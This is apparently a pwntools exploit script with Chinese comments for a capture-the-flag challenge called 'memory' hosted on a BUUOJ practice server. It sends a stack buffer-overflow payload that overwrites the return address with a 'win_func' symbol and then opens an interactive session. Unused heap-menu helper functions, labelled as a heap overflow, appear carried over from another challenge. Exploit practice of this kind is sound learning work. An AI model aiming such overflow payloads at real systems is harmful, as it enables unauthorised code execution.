from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'memory'
port = 27898

###########修改宏###########
DEBUG = 0
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    stop_count = -1
    def STOP(idx=0):
        global stop_count
        stop_count += 1
        input('stop{}...... ===> {}'.format(stop_count, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    def STOP(idx=0):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libs))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
堆溢出
'''

def add_user(size:int, text:bytes, name:bytes, ):
    global io
    io.sendlineafter("Action: ", b'0')
    io.sendlineafter("size of description: ", str(size).encode())
    io.sendlineafter("name: ", name)
    io.sendlineafter("text length: ",  str(len(text)).encode())
    io.sendlineafter("text: ", text)

def del_user(idx:int):
    global io
    io.sendlineafter("Action: ", b'1')
    io.sendlineafter("index: ", str(idx).encode())


def display_user(idx:int):
    global io
    io.sendlineafter("Action: ", b'2')
    io.sendlineafter("index: ", str(idx).encode())
    name = io.recvline()
    des = io.recvline()
    return name, des

def update_user(idx:int, text:bytes):
    global io
    io.sendlineafter("Action: ", b'3')
    io.sendlineafter("index: ", str(idx).encode())
    io.sendlineafter("text length: ",  str(len(text)).encode())
    io.sendlineafter("text: ", text)

    
'''

'''

# io.recvuntil(b'\n\n\n------Test Your Memory!-------\n\n')
# msg1 = io.recvuntil("\nwhat???? : \n")
# msg2 = io.recv()
# print('='*100)
# print(msg1)
# print('='*100)
# print(msg2)

# s2 = msg1[:4]
# # s2 = s2[::-1]
# print(s2)
# hint = msg2[:10]
# print(hint)
# hint = int(hint.decode(), 16)
payload = b'aaaa' + (0x13 - 4 + 4) * b'a' + p32(io_elf.sym['win_func']) + p32(io_elf.sym['main']) + p32(0x80487e0)

io.sendline(payload)


io.interactive()
